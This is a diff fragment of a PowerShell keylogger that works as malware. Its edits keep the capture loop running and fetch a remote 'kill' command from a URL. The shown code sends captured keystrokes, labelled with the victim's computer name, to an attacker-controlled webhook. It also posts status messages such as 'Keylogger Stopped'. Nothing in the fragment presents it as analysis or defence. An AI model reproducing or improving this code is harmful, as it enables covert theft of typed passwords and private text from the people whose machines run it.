@@ -652,11 +652,11 @@ While ($true){
         $jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":mag_right: ``Keylogger Stopped`` :octagonal_sign:"} | ConvertTo-Json
         Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
         $previouscmd = $response
-        return 0
         }
     }
     finally{
-        If ($keyPressed -and $messages -notcontains "kill") {
+        $messages = Invoke-RestMethod -Uri $GHurl
+        If (($keyPressed) -and (!($messages -match "kill"))) {
             $escmsgsys = $nosave -replace '[&<>]', {$args[0].Value.Replace('&', '&amp;').Replace('<', '&lt;').Replace('>', '&gt;')}
             $jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":mag_right: ``Keys Captured :`` $escmsgsys"} | ConvertTo-Json
             Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
@@ -668,7 +668,6 @@ $LastKeypressTime.Restart()
 Start-Sleep -Milliseconds 10
 if ($messages -match "kill") {return 0}
 }
-break
 }
 
 Function GetFfmpeg{
